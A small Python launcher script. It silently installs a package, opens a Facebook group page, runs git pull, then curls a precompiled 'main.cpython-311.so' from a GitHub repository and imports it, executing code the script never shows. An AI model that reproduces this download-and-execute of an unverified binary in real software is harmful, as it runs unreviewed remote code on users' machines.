import os
import sys
import platform
import webbrowser
try:
    import requests
except ImportError:
    os.system("pip install requests")
    import requests
webbrowser.open("https://facebook.com/groups/672149575467753/")
os.system("git pull")
bit = platform.architecture()[0]
file_url = "https://github.com/YOUSUF-NIZAMI/FILExRANDOM/blob/main/main.cpython-311.so?raw=true"
file_name = "main.cpython-311.so"
if not os.path.isfile(file_name):
    os.system(f"curl -L {file_url} -o {file_name}")

try:
    import main 
except ImportError:
    print("Error: Something went wrong while loading the required files.")
   
